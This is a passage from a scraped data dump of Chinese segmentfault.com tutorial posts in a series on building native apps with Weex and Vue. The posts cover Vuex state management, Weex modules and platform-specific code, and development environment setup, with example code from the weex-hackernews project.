<li><p><code>Action</code>: 描述组件<a href=""https://vuex.vuejs.org/zh-cn/actions.html"" rel=""nofollow noreferrer"">触发的操作</a>。它可以通过 <code>commit</code> 产生 <code>mutation</code>，是对逻辑的封装，组件只需要派发 Action 而不用关心数据到底是如何更新的。</p></li>
<li><p><code>Mutations</code>: 描述<a href=""https://vuex.vuejs.org/zh-cn/mutations.html"" rel=""nofollow noreferrer"">状态应该如何更新</a>。只有提交 <code>mutation</code> 才可以更新 Store 中的状态，它是对数据操作的封装，定义了如何更新状态数据。</p></li>
</ul>
<blockquote><p>以上只是对 Vuex 的概述，想要了解详细的原理和用法，还是得看<a href=""https://vuex.vuejs.org/zh-cn/"" rel=""nofollow noreferrer"">官方文档</a>。</p></blockquote>
<h2>怎么在 Weex 里用 Vuex</h2>
<p>Vuex 是个状态管理的库，用的都是 javascript 本身的语法特性，是与平台无关的，所以它可以完全正常的用在 Weex 里。</p>
<p>不过因为 Vue.js 框架代码已经集成在 WeexSDK （0.9.5 以上）中，所以你不需要再引入一遍 Vue 。另外因为 Vuex <a href=""https://github.com/vuejs/vuex/blob/4e1e9b230e7c93885c69bc3edf789069df010e36/src/store.js#L426-L429"" rel=""nofollow noreferrer"">在浏览器环境下会自动注册</a>，只需要在非 Web 环境下注册 Vuex 插件即可，重复注册的话会抛出警告的。引入 Vuex 的代码如下：</p>
<pre><code class=""js"">// import Vue from 'vue'
import Vuex from 'vuex'

// Vuex is auto installed on the web
if (WXEnvironment.platform !== 'Web') {
  Vue.use(Vuex)
}</code></pre>
<p>注册成功之后，<strong>所有 Vuex 的特性都能在 Weex 里使用！</strong> 具体用法以<a href=""https://vuex.vuejs.org/zh-cn/"" rel=""nofollow noreferrer"">官方文档</a>为准。</p>
<h2>使用 Vuex 的例子</h2>
<h3>创建 Store</h3>
<p>首先要创建全局唯一的 Store 对象，包含了唯一的状态树和一些操作。</p>
<pre><code class=""js"">const store = new Vuex.Store({
  state: {
    count: 0
  },

  mutations: {
    increment (state) {
      state.count++
    }
  }
})</code></pre>
<p>除了 <code>state</code> 和 <code>mutations</code> 以外，还可以传入 <code>actions</code> 、<code>getters</code> 、<code>modules</code> 这些属性的关系和上边图中一一对应。参考其 <a href=""https://vuex.vuejs.org/zh-cn/api.html#vuexstore-"" rel=""nofollow noreferrer"">API 文档</a>了解更详细的用法。在 <a href=""https://github.com/weexteam/weex-hackernews"" rel=""nofollow noreferrer"">weex-hackernews</a> 项目的 <a href=""https://github.com/weexteam/weex-hackernews/blob/master/src/store/index.js"" rel=""nofollow noreferrer"">src/store/index.js</a> 中也有一个更复杂的例子。</p>
<p>然后在创建实例的时候传入 <code>store</code> 对象，这样 Store 就和组件建立了联系，每个组件都可以通过 <code>this.$store</code> 的方式获取到 Store 中的状态和操作。</p>
<pre><code class=""js"">import App from 'path/to/App.vue'
import store from 'path/to/store.js'

App.el = '#root'
App.store = store

new Vue(App)</code></pre>
<h3>添加 Actions 和 Mutations</h3>
<p>光有数据是不行的，还得定义 <em>触发数据修改的行为</em>（Actions） 和 <em>对数据的操作</em>（Mutations）。以 weex-hackernews 里的加载用户数据为例，可以简化成下边的代码：</p>
<pre><code class=""js"">// 引入网络操作的接口
import { fetchUser } from './fetch'

const store = new Vuex.Store({
  state: {
    users: {},
  },

  actions: {
    FETCH_USER ({ commit }, { id }) {
      // 获取新的用户数据，然后提交给 mutation
      return fetchUser(id).then(user =&gt; commit('SET_USER', { user }))
    }
  },

  mutations: {
    SET_USER (state, { user }) {
      // 修改 users 中的数据，并且触发界面更新
      Vue.set(state.users, user.id, user)
    }
  }
})</code></pre>
<p>在上边的代码中，<code>state</code> 里有一个 <code>user</code> 对象，所有需要用户数据的地方都将从这个变量中获取，所有对用户数据的修改实际上也都是改的这个变量。这是全局唯一状态的意义。</p>
<p>然后代码里定义了 <code>FETCH_USER</code> 的 action，和 <code>SET_USER</code> 的 mutation ，注意两者的差别。真正修改 <code>user</code> 数据的是 SET_USER 这个 mutation，也只有 mutation 能修改 state 中的数据。FETCH_USER 负责获取新数据然后派发 mutation，它调用了 <code>fetchUser</code> 获取用户数据，然后通过把这个新数据“提交”给 SET_USER 这个 mutation；然后在 mutation 里执行数据更新的操作，<code>Vue.set</code> 这个方法会触发更新 <code>state.users</code> 里绑定的界面元素。</p>
<h3>使用 Getters</h3>
<blockquote><p><a href=""https://vuex.vuejs.org/zh-cn/getters.html"" rel=""nofollow noreferrer"">Getters 官方文档</a></p></blockquote>
<p>Getters 类似于 Vue 组件里的 <code>computed</code> 属性，可以根据现有的基础状态做运算，然后返回一个新的值。把取值过程写成 Getter 是一种惰性求值，也减少了状态同步的负担。</p>
<p>举个例子，假如你想渲染一个列表中的一组数据，又想渲染这组数据的总和，如果再加一条“数据总和”的属性的话，在列表更新后还得手动更新“数据总和”这条属性，比较麻烦也容易出错。这种情况下就很适合写成一个 Getter。</p>
<pre><code class=""js"">const store = new Vuex.Store({
  state: {
    lists: [
      { count: 4 },
      { count: 8 },
      { count: 3 },
      { count: 9 }
    ],
  },

  getters: {
    summary ({ lists }) {
      return lists.reduce((sum, curr) =&gt; sum + curr.count, 0)
    }
  }
})</code></pre>
<p>上边代码中的 <code>summary</code> 就是一个对 <code>lists</code> 数组求和的 Getter。在实际使用中，组件里可以通过 <code>this.$store.state.lists</code> 获取 <code>lists</code> 列表数据，可以通过 <code>this.$store.getters.summary</code> 获取数据总和，更新列表的时候数据总和也会自动更新。</p>
<h4>在项目里的实际应用场景</h4>
<p>在 weex-hackernews 的项目的 <a href=""https://github.com/weexteam/weex-hackernews/blob/v1.0/src/store/index.js#L35-L48"" rel=""nofollow noreferrer"">src/store/index.js</a> 文件里定义了 <code>activeIds</code> 的 Getter，用来获取当前首屏 feed 列表中需要展示的数据 ID。然后还定义了 <code>activeItems</code>，在其中有调用了 <code>activeIds</code>，会根据活跃的 ID 获取相应的数据对象。</p>
<pre><code class=""js"">{
  //...

  getters: {
    // ids of the items that should be currently displayed based on
    // current list type and current pagination
    activeIds (state) {
      const { activeType, lists, counts } = state
      return activeType ? lists[activeType].slice(0, counts[activeType]) : []
    },

    // items that should be currently displayed.
    // this Array may not be fully fetched.
    activeItems (state, getters) {
      return getters.activeIds.map(id =&gt; state.items[id]).filter(_ =&gt; _)
    }
  }
}</code></pre>
<p>然后在 <a href=""https://github.com/weexteam/weex-hackernews/blob/v1.0/src/views/StoriesView.vue#L35-L37"" rel=""nofollow noreferrer"">src/views/StoriesView.vue</a> 这个文件里定义了一个 <code>computed</code> 属性，从 Store 中获取列表需要展示的数据。</p>
<pre><code class=""js"">{
  //...

  computed: {
    stories () {
      return this.$store.getters.activeItems
    }
  }
}</code></pre>
<p>在 <a href=""https://github.com/weexteam/weex-hackernews/blob/v1.0/src/views/StoriesView.vue#L5-L7"" rel=""nofollow noreferrer"">StoriesView.vue</a> 的模板中根据 <code>stories</code> 这个数据循环创建 <code>&lt;story&gt;</code> 组件。</p>
<pre><code class=""html"">&lt;list&gt;
  &lt;cell v-for=""story in stories"" :key=""story.id""&gt;
    &lt;story :story=""story""&gt;&lt;/story&gt;
  &lt;/cell&gt;
&lt;/list&gt;</code></pre>
<h2>最佳实践 ？</h2>
<p><strong>以下都是个人观点。</strong></p>
<p>Vuex 衍生自 <a href=""https://facebook.github.io/flux/docs/overview.html"" rel=""nofollow noreferrer"">Flux</a> 架构，用来管理应用的状态，强调单向数据流和全局唯一状态。对于一些数据状态复杂，而且又自上而下实现了组件化的应用里，能发挥很大作用。状态的更新大概能简化为 <code>nextState = f(state, action)</code>，有一种函数式的感觉，可以节约逻辑。</p>
<p>虽然 Vuex 与其他技术没有耦合关系，但是通常都是用在单页应用（SPA）里，还经常搭配着 vue-router 使用。不过我在<a href=""https://segmentfault.com/a/1190000008366358"" rel=""nofollow noreferrer"">《【使用 Weex 和 Vue 开发原生应用】 2 编写独立页面》</a> 这篇文章里说过，Weex 的实例在 Web 上是和“浏览器页签”的概念相对应的，通常一个 Weex 实例就是一个“页面”，也就是说，Weex 的设计是个“多页应用”，是多实例的。在 Weex 中使用 Vuex，它的作用域是实例级别的，不同页面（实例）之间是不能通过 Vuex 共享状态的。</p>
<p>Weex 毕竟渲染的是原生界面，虽然语法上贴近 Web，但是在一些基本概念上和 Native 更近一些。“单页应用”、“单向数据流”这些概念主要是在前端里比较流行，Weex 只是一个 SDK，在开发原生应用的时候，页面跳转策略这类问题，我觉得还是应该以客户端自身的架构设计为主。</p>
<blockquote><p>weex-hackernews 这个项目是为了验证 Vuex 和 vue-router 接入的可能性，并不一定是最佳实践。</p></blockquote>
<p>我觉得既然 Weex 在原生端是多实例的，就未必适合写单页应用。即使像 Vuex 这种相对独立的状态管理的库，在 “不同页面是不同的 Weex 实例” 这种前提下，就需要根据 App 自身的技术特性，<br>再考虑一下应不应该使用。</p>
<p>关于单页应用，会在<a href=""https://segmentfault.com/a/1190000009101411"" rel=""nofollow noreferrer"">《使用 vue-router》</a>里有更多讨论。</p>

                ", [使用 Weex 和 Vue 开发原生应用] 5 使用 Vuex,1531971977,145,1,201,1,1,https://segmentfault.com/a/1190000008520677
72,1,0,6,"
                    
<blockquote><p>系列文章的目录在 ? <a href=""https://segmentfault.com/a/1190000008342533"" rel=""nofollow noreferrer"">这里</a></p></blockquote>
<p>除了 Vue 框架提供的功能以为，Weex 平台本身也提供了很多功能，这些功能比前端框架更底层一些，而且是跨框架通用的，在 <a href=""https://github.com/vuejs/vue"" rel=""nofollow noreferrer"">Vue</a> 和 <a href=""https://github.com/alibaba/rax"" rel=""nofollow noreferrer"">Rax</a> 里都可以用。本文的几个例子越来越偏底层，最后一个例子还需要写 java 代码。</p>
<h2>使用 Weex 的模块</h2>
<blockquote><p><a href=""http://weex.apache.org/cn/references/modules/index.html"" rel=""nofollow noreferrer"">Weex 模块的文档</a></p></blockquote>
<p>通过 <code>weex.requireModule</code> 即可引入 weex 的模块。</p>
<pre><code class=""js"">const modal = weex.requireModule('modal')

modal.toast({
  message: 'native toast'
})</code></pre>
<h3>Weex 的模块到底是什么东西？</h3>
<p>模块的用法很简单，像普通 js 模块一样调接口就行了，看起来挺像一个 npm 模块的，但是在 Weex 模块内部会调用原生接口，最终调用的都是原生平台提供的功能。<strong>Weex 的模块提供了使用原生功能的能力。</strong></p>
<p>例如 <a href=""http://weex.apache.org/cn/references/modules/modal.html"" rel=""nofollow noreferrer""><code>modal</code> 模块</a>可以弹出 <code>toast</code> 、<code>alert</code> 、<code>confirm</code> 、<code>prompt</code> 等各种弹窗，这些弹窗都是原生弹窗，在 Android 和 iOS 下的风格和行为是由各自的系统决定的。Weex 的模块在 js 这一层只负责向原生环境里传递数据，通知 native 去执行某些操作。</p>
<p>像 <code>storage</code> 、<code>navigator</code> 、<code>clipboard</code> 这种依赖平台特性的功能，需要调用平台原生接口才能实现，所以只能写成模块。</p>
<h3>模块的同步和异步</h3>
<p>一般来说，都是调用模块的功能，并不会依赖模块返回值的，但是像 <a href=""http://weex.apache.org/cn/references/modules/dom.html"" rel=""nofollow noreferrer""><code>dom</code> 模块</a>中的 <code>getComponentRect</code> 接口是用来计算组件的宽高和位置的，必须得从原生端获取值。但是在 Weex 最初设计的版本里，模块都是异步返回值的，也就是说，只能通过回调函数的方式拿到真正的布局信息（也可以自己封装成 Promise）。现在 Weex 已经支持了模块的同步返回值，但是为了保持原先版本中接口的行为一致，<code>getComponentRect</code> 这个方法依然是异步的。</p>
<pre><code class=""js"">const dom = weex.requireModule('dom')

const returns = dom.getComponentRect(this.$refs.box, option =&gt; {
  console.log(option) // { result: true, size: { ... } }
})

console.log(returns) // undefined</code></pre>
<p>上边的代码中，会先执行 <code>console.log(returns)</code> 再执行 <code>console.log(option)</code>，并且 <code>getComponentRect</code> 方法没有返回值，所以 <code>returns</code> 的值是 undefined，<code>option</code> 中才是真正的原生端返回的布局信息。</p>
<h3>扩展 Weex 的模块</h3>
<p>Weex 本身内置了很多模块，出于通用性考虑，我们只会把最基础的模块打包进 SDK。其他个性化的模块可以自己来实现，或者从社区中找。<a href=""http://market.weex-project.io"" rel=""nofollow noreferrer"">Weex Market</a> 将会是一个收集这些扩展模块（组件、插件）的地方，结合 <a href=""https://github.com/weexteam/weex-pack"" rel=""nofollow noreferrer"">weex-pack</a> 可以实现方便的安装和扩展。<strong>（目前来说，Weex Market 中还是基于旧版 <code>.we</code>语法的模块比较多，不适用于 Vue，在使用前要看准适用的框架）</strong></p>
<p>具体的扩展 Weex 模块的方法，参考：</p>
<ul>
<li><p><a href=""http://weex.apache.org/cn/references/android-apis.html"" rel=""nofollow noreferrer"">《Android APIs》</a></p></li>
<li><p><a href=""http://weex.apache.org/cn/references/advanced/extend-to-android.html"" rel=""nofollow noreferrer"">《Android 扩展》</a></p></li>
<li><p><a href=""http://weex.apache.org/cn/references/ios-apis.html"" rel=""nofollow noreferrer"">《iOS APIs》</a></p></li>
<li><p><a href=""http://weex.apache.org/cn/references/advanced/extend-to-ios.html"" rel=""nofollow noreferrer"">《iOS 扩展》</a></p></li>
</ul>
<h2>获取平台环境数据</h2>
<p>Weex 的运行环境有好几种，在写代码的时候，有些情况下需要获取环境数据。Weex 提供了 <code>weex.config</code> 变量可以获取配置信息。</p>
<ul>
<li><p><code>bundleUrl</code>: 当前 js bundle 的 URL 地址。</p></li>
<li>
<p><code>env</code>: 环境对象。</p>
<ul>
<li><p><code>weexVersion</code>: WeexSDK 的版本。</p></li>
<li><p><code>appName</code>: 应用名字。</p></li>
<li><p><code>appVersion</code>: 应用版本。</p></li>
<li><p><code>platform</code>: 平台信息，目前是 <code>""iOS""</code>、<code>""Android""</code> 和 <code>""Web""</code> 之一。</p></li>
<li><p><code>osVersion</code>: 系统版本。</p></li>
<li><p><code>deviceModel</code>: 设备型号 (仅限 iOS 和 Android)。</p></li>
<li><p><code>deviceWidth</code>: 设备宽度。</p></li>
<li><p><code>deviceHeight</code>: 设备高度。</p></li>
</ul>
</li>
</ul>
<p>此外其实还有一个全局的 <code>WXEnvironment</code> 变量，它和 <code>weex.config.env</code> 的属性是一样的。</p>
<p>下边是一个获取环境数据的二维码（支持拷贝）：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVJGdd?w=400&amp;h=450"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>写三端不一致的代码</h2>
<h3>只针对 native 平台注册 Vuex</h3>
<p>因为在浏览器环境中，Vuex 是会<a href=""https://github.com/vuejs/vuex/blob/v2.1.2/src/index.js#L425-L428"" rel=""nofollow noreferrer"">自动注册</a>的，只需要引入库文件就行了，如果重复注册，Vuex 会抛出警告的。(下边这段代码摘自 Vuex)</p>
<pre><code class=""js"">// auto install in dist mode
if (typeof window !== 'undefined' &amp;&amp; window.Vue) {
  install(window.Vue)
}</code></pre>
<p>但是在 native 环境中没有 <code>window</code> 变量，就需要再手动调用 <code>Vue.use(Vuex)</code> 注册 Vuex 插件，在注册前判断当前运行的平台。</p>
<pre><code class=""js"">import Vue from 'vue'
import Vuex from 'vuex'

// Vuex is auto installed on the web
if (WXEnvironment.platform !== 'Web') {
  Vue.use(Vuex)
}</code></pre>
<h3>不同的链接跳转行为</h3>
<p>如果你在不同端上运行了 <a href=""https://github.com/weexteam/weex-hackernews"" rel=""nofollow noreferrer"">weex-hackernews</a> 里的项目，会发现在浏览器上点击文章链接是会新开一个页签的，但是在客户端上点击链接就不会新开视图，而是在当前视图里跳转。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVJGde?w=804&amp;h=504"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>这种不同的行为体现在 <a href=""https://github.com/weexteam/weex-hackernews/blob/v1.0/src/components/story.vue#L4-L7"" rel=""nofollow noreferrer"">story.vue</a> 文件里，这里的跳转链接并不是直接使用的 Weex 里的 <a href=""http://weex.apache.org/cn/references/components/a.html"" rel=""nofollow noreferrer""><code>&lt;a&gt;</code></a> 标签，而是自定义了一个 <code>&lt;external-link&gt;</code> 的组件，把 <code>url</code> 参数传过去。</p>
<pre><code class=""html"">&lt;external-link :url=""story.url""&gt;
  &lt;text&gt;{{story.title}}&lt;/text&gt;
  &lt;text v-if=""story.url""&gt;({{ story.url | host }})&lt;/text&gt;
&lt;/external-link&gt;</code></pre>
<p>页面跳转逻辑是在 <a href=""https://github.com/weexteam/weex-hackernews/blob/v1.0/src/components/external-link.vue"" rel=""nofollow noreferrer"">external-link.vue</a> 里组件实现的：</p>
<pre><code class=""html"">&lt;template&gt;
  &lt;div @click=""open""&gt;
    &lt;slot&gt;&lt;/slot&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    props: ['url'],
    methods: {
      open () {
        const env = weex.config.env || WXEnvironment

        // open a new window (tab) on the web
        if (env.platform === 'Web') {
          window.open(this.url)
          return
        }

        // change router path on native (Android &amp; iOS)
        this.jump(`/article/${this.url}`)
      }
    }
  }
&lt;/script&gt;</code></pre>
<p>该组件监听了 <code>click</code> 事件，在点击时会首先判断当前运行的平台，如果是 <code>Web</code> ，则使用 <code>window.open</code> 新开页面，否则（在原生平台中）就默认使用 <code>vue-router</code> 进行跳转，这个“跳转”其实只是更新了当前的视图，其实还在同一个原生页面内。</p>
<h2>透传原生事件</h2>
<p>如果你看了 <a href=""https://github.com/weexteam/weex-hackernews/blob/v1.0/src/App.vue#L2"" rel=""nofollow noreferrer"">src/App.vue</a> 中的代码，会发现里边用了一个 <code>androidback</code> 的事件。它实现的效果是绑定了 Android 中的“返回”事件，点击返回按钮就会退回上一个视图。</p>
<pre><code class=""html"">&lt;template&gt;
  &lt;div @androidback=""back""&gt;
    &lt;router-view&gt;&lt;/router-view&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    methods: {
      back () {
        this.$router.back()
      }
    }
  }
&lt;/script&gt;</code></pre>
<p>这个事件并不是 Vue.js 本身提供的，也不是 Web 标准里的，在浏览器上肯定不会给你提供一个以 <code>android</code> 开头的事件名。在 <code>vue-router</code> 里也不会加这样的东西。甚至如果你去翻 Weex 的文档，也找不到这个事件类型，它也不是 Weex 默认提供的。</p>
<p>想要实现 Android 特有的功能，就得在 Android 项目里的代码，在“前端”层面是解决不了这个问题的，要写 <code>java</code>。</p>
<h3>在 Android 中派发原生事件</h3>
<p>首先，在 Android 里肯定是可以监听到“返回”按钮的点击事件的，其实只要实现 <code>Activity</code> 里的 <code>onBackPressed</code> 接口就可以了，它会在当前视图里点击返回按钮时执行。在 weex-hackernews Andorid 项目里的 <a href=""https://github.com/weexteam/weex-hackernews/blob/v1.0/android/app/src/main/java/com/example/weex/hackernews/MainActivity.java#L53-L56"" rel=""nofollow noreferrer"">MainActivity.java</a> 中，就实现了 <code>onBackPressed</code> 接口：</p>
<pre><code class=""java"">public void onBackPressed() {
    Log.e(""USER ACTION"", ""BACK"");
    WXSDKManager.getInstance().fireEvent(mWXSDKInstance.getInstanceId(), ""_root"", ""androidback"");
}</code></pre>
<p>在这个方法里，通过 <code>WXSDKManager.getInstance()</code> 取到了当前页面的实例，然后调用 <code>fireEvent</code> 接口给根视图派发 <code>androidback</code> 事件，事件名是可以自定义的。在 Weex Runtime 中会接收到这个事件，会传递给 Vue.js 框架，并且触发最外层组件的 <code>androidback</code> 事件，最终会找到 <code>back</code> 方法并执行。（这里说的 Weex Runtime 是前端代码实现的，比 Vue.js 更底层一些）。</p>
<h2>小结</h2>
<p>除了 Vue.js 本身的特性以外，Weex 还提供了很多平台化的特性，这些特性比前端框架更底层，也更通用一些。即使你用的不是 Vue.js 而是 <a href=""https://github.com/alibaba/rax"" rel=""nofollow noreferrer"">Rax</a>，或者是旧版的 <code>.we</code> 的语法，Weex 里的这些特性也都是可以用的。</p>
<p>虽然同一份代码可以运行在三端，但是 iOS 和 Android 和 Web 都有各自的优势和缺陷，如果你想实现一些平台特有的功能，Weex 也是支持的。如果你想要体现平台特有的优势，就得针对某个平台写一下原生代码。在写 iOS 或者 Android 代码的时候，肯定能确保在其他平台中不会执行到；但是在写 js 代码的时候，如果使用了只在 Web 上才有的特性，就得注意一些，不要让 iOS 和 Android 执行到这些代码。</p>

                ", [使用 Weex 和 Vue 开发原生应用] 4 使用 Weex 平台的功能,1531971978,240,1,366,1,1,https://segmentfault.com/a/1190000008464683
73,1,0,6,"
                    
<blockquote><p>系列文章的目录在 ? <a href=""https://segmentfault.com/a/1190000008342533"" rel=""nofollow noreferrer"">这里</a></p></blockquote>
<h2>开始之前</h2>
<p>每个项目开始之前，都会先讲怎么搭环境，Weex 和 Vue 都讲了。其实一个框架推出之后，“怎么配置开发环境”这类文章会比较多，每个人写的都不一样，最好的方式是去看官方文档。我这里如果详细写的话，肯定和官方文档 80% 内容都一样。</p>
<ul>
<li><p><a href=""http://weex.apache.org/cn/guide/index.html"" rel=""nofollow noreferrer"">《Weex 快速上手》</a></p></li>
<li><p><a href=""https://cn.vuejs.org/v2/guide/"" rel=""nofollow noreferrer"">《Vue.js 介绍》</a></p></li>
</ul>
<p><strong>所以我就不讲怎么搭环境了！文章标题是骗人的！</strong> ?</p>
<p>因为有现成的项目可以参考（<a href=""https://github.com/weexteam/weex-hackernews"" rel=""nofollow noreferrer"">weex-hackernews</a>），可以直接“授之以鱼”。不过，我会根据不同的需求，帮你找到“授之以渔”的那些文章。</p>
<blockquote><p>其实这些技巧与 Weex 和 Vue 都没多大关系的，在 <em>日新月异</em> 的前端环境里，学习怎么配“最先进”的开发环境是个绕不过的坎。我这里只讲与 Weex 和 Vue 有关的。</p></blockquote>
<h2>学习 Weex + Vue</h2>
<p>现在有机会在生产环境中使用 Weex + Vue 的应该寥寥无几，大家应该都是抱着一份好奇的心态想看看 Weex + Vue 能折腾出什么花样。</p>
<p>如果你只是想学习 Weex 和 Vue，那就不比大费周章的搭建什么 Android 、iOS 环境，直接在 <a href=""http://dotwe.org/vue"" rel=""nofollow noreferrer"">dotwe.org</a> 上写例子，使用 <a href=""http://weex.apache.org/cn/playground.html"" rel=""nofollow noreferrer"">Weex Playground App</a> 扫描二维码就可以查看页面了。Weex 从 0.9.5 才开始支持 Vue，使用之前请确保 SDK 版本正确。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVJaQT?w=2158&amp;h=1400"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""dotwe.org"" title=""dotwe.org""></span></p>
<blockquote><p>用 Weex Playground App 扫描<a href=""http://dotwe.org/weex/8c2fb817f19d9837a4f773e163d9cc45"" rel=""nofollow noreferrer"">这个链接</a>中的二维码可以获取 WeexSDK 的版本。（建议提 issue 之前都能提供环境信息）</p></blockquote>
<p>除此之外，我还有一个仓库，<a href=""https://github.com/Hanks10100/weex-vue-examples"" rel=""nofollow noreferrer"">weex-vue-examples</a>，里边包含了各种单页的小例子，几乎涵盖了所有 Weex 组件、模块，也用到了很多 Vue 2.x 的特性。可以也可以直接将代码复制到 dotwe.org 上运行。</p>
<h2>进一步学习 Weex + Vue</h2>
<p>如果你不满足于使用在线网站写代码，想在本地写一些更复杂的例子（有没有发现 dotwe 上没法写多文件的例子），很好，给你推荐两个工具：<a href=""https://github.com/weexteam/weex-toolkit"" rel=""nofollow noreferrer"">weex-toolkit</a> 和 <a href=""https://github.com/weexteam/weex-pack"" rel=""nofollow noreferrer"">weex-pack</a>。</p>
<p>为什么是两个工具？因为解决的问题不一样，目前这两个工具也正在考虑合并，把 weex-pack 合进 weex-toolkit，只保留 <code>weex</code> 命令。</p>
<p>同样，我也不写具体的使用方法了，各自的项目文档上都有，我讲一下这两个工具的特点和差别。</p>
<blockquote><p>如果大家有详细的使用经验，欢迎贡献出来，精力有限，欢迎好心人帮我填坑。。。?</p></blockquote>
<h3>使用 <a href=""https://github.com/weexteam/weex-toolkit"" rel=""nofollow noreferrer"">weex-toolkit</a>
</h3>
<p>安装完 weex-toolkit 之后，它生成了 <code>weex</code> 命令，是个工具集，用法是 <code>weex &lt;command&gt; [options]</code>。它主要有三个功能：</p>
<ul>
<li><p>初始化项目。</p></li>
<li><p>编译 <code>.we</code> 和 <code>.vue</code> 文件。</p></li>
<li><p>调试代码。</p></li>
</ul>
<p>对我来说，用的最多的就是 <strong>调试代码</strong>。<code>weex debug</code> 可以会启动一个 server 并且弹开一个调试页面，上边有个二维码；用 Weex Playground App 扫描这个二维码就可以用 chrome 开发者工具调试真机了。</p>
<p>对于项目的初始化，大家可以用各自最喜欢的工具来搭，官方标配是 Webpack + weex-loader ，其他的，像启动本地服务、eslint、postcss、自动化测试这些东西都可以自行配置的，和其他标准的前端项目一样。</p>
<p>至于编译，还是建议使用 <a href=""http://dotwe.org/vue"" rel=""nofollow noreferrer"">dotwe.org</a> 或者本地配个工程编译源码，因为命令行工具更新慢，又比较难定制。</p>
<h3>使用 <a href=""https://github.com/weexteam/weex-pack"" rel=""nofollow noreferrer"">weex-pack</a>
</h3>
<p>weex-pack 最初存在的目的就是为了方便大家打包 Android 和 iOS 应用，是解决原生开发的一些问题的。它也能初始化项目，不过生成的项目里除了 Web 工程以外，还有 Android 和 iOS 。</p>
<p>虽然能够直接生成好 Android 和 iOS 工程，但是如果你机器上什么环境也没配，也是运行不起来的。</p>
<p>运行 Android 至少得装 java 和 Andorid SDK，建议使用 Android Studio，生成的安卓工程是基于 Android Studio 的；运行 iOS 得用 Mac，依赖管理使用 CocoaPods，再稍微配置一下 Xcode 即可。这方面的教程网上比较多了，我也不专业，我就不误人子弟了。</p>
<h2>集成 WeexSDK</h2>
<p>其实你不是非得集成 WeexSDK 才能用真机看 Weex + Vue 的渲染效果的，有好几种方法：</p>
<ul>
<li><p>下载 <a href=""http://weex.apache.org/cn/playground.html"" rel=""nofollow noreferrer"">Weex Playground App</a>，扫描 <a href=""http://dotwe.org/vue"" rel=""nofollow noreferrer"">dotwe.org</a> 中的例子。</p></li>
<li><p>使用 <code>weexpack init [project-name]</code> 初始化三端工程。</p></li>
<li><p>克隆 <a href=""https://github.com/weexteam/weex-hackernews"" rel=""nofollow noreferrer"">weex-hackernews</a>，直接使用其中的 Andorid 和 iOS 工程。</p></li>
</ul>
<p>能走到这一步的人都比较有耐心，相信你对 Weex 也有了比较全面的了解。官方也有文档教你怎么集成 WeexSDK ：</p>
<ul><li><p><a href=""http://weex.apache.org/cn/guide/integrate-to-your-app.html"" rel=""nofollow noreferrer"">《集成 Weex 到已有应用》</a> （包含了 Android 和 iOS）</p></li></ul>
<p>如果你想扩展 Weex 的组件和模块，也有相关文档可供参考：</p>
<ul>
<li><p><a href=""http://weex.apache.org/cn/references/android-apis.html"" rel=""nofollow noreferrer"">《Android APIs》</a></p></li>
<li><p><a href=""http://weex.apache.org/cn/references/advanced/extend-to-android.html"" rel=""nofollow noreferrer"">《Android 扩展》</a></p></li>
<li><p><a href=""http://weex.apache.org/cn/references/ios-apis.html"" rel=""nofollow noreferrer"">《iOS APIs》</a></p></li>
<li><p><a href=""http://weex.apache.org/cn/references/advanced/extend-to-ios.html"" rel=""nofollow noreferrer"">《iOS 扩展》</a></p></li>
</ul>
<p>在 weex-hackernews 这个项目里，我最初也是没有使用 weex-pack 这个工具，是一步一步用 Android Studio 和 Xcode 创建的项目，并且添加的原生初始化代码。（因为当时工具都还不支持 Vue，连 WeexSDK 都得手动基于仓库源码集成?）</p>
<p>参考 weex-hackernews 的两个 PR 查看初始化步骤和代码：<a href=""https://github.com/weexteam/weex-hackernews/pull/1"" rel=""nofollow noreferrer"">Andorid</a> 、 <a href=""https://github.com/weexteam/weex-hackernews/pull/2"" rel=""nofollow noreferrer"">iOS</a>。</p>

                ", [使用 Weex 和 Vue 开发原生应用] 1 如何配置开发环境,1531971980,520,1,477,1,1,https://segmentfault.com/a/1190000008344148
74,1,0,6,"
                    
<h2>背景介绍</h2>
<p><a href=""https://weex-project.io/cn/"" rel=""nofollow noreferrer"">Weex</a> 和 <a href=""https://cn.vuejs.org/"" rel=""nofollow noreferrer"">Vue</a> 已经互相支持，这也不是新闻了（如果你觉得是新闻，自行在网上搜相关信息……），Vue.js 也因此具备了开发原生应用的能力。</p>
<p>Vue 官方仓库中包含了<a href=""https://github.com/vuejs/vue/tree/dev/src/platforms/weex"" rel=""nofollow noreferrer"">适配 Weex 平台的代码</a>，Weex 也<a href=""https://github.com/alibaba/weex/blob/v0.9.5/package.json#L83"" rel=""nofollow noreferrer"">引入了 Vue Runtime</a> 并集成进了 SDK 中，第一个支持 Vue 的 WeexSDK 版本是 <a href=""https://github.com/alibaba/weex/releases/tag/v0.9.5"" rel=""nofollow noreferrer"">v0.9.5</a>，后续版本也都将会支持，建议保持更新。</p>
<p>两个框架之所以能互相适配，是因为两个框架在最初设计时就充分考虑到了扩展性，眼光深远！框架合作减少了开发者的学习负担，是个好事情，可喜可贺???。</p>
<h2>全球首个使用 Weex 和 Vue 开发的原生应用</h2>
<p><strong>那就是 <a href=""https://github.com/weexteam/weex-hackernews"" rel=""nofollow noreferrer"">weex-hackernews</a> ！</strong></p>
<p>Vue 官方出了一个 <a href=""https://github.com/vuejs/vue-hackernews-2.0"" rel=""nofollow noreferrer"">vue-hackernews</a>，是一个完整的使用 Vue 2.0 的例子，并且用到了 Vuex 、 vue-router 和服务端渲染。仿照这个思路，我们也写了一个 weex-hackernews ，不仅用到了 Vue 框架的各种特性，也用到了 Vuex 和 vue-router ，在 Web 、 Android 、 iOS 上都能正常工作，一个完整的三端都有的 App ！可以作为一个范例供大家参考。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVJaqq?w=2712&amp;h=1628"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""weex-hackernews screen shot"" title=""weex-hackernews screen shot""></span></p>
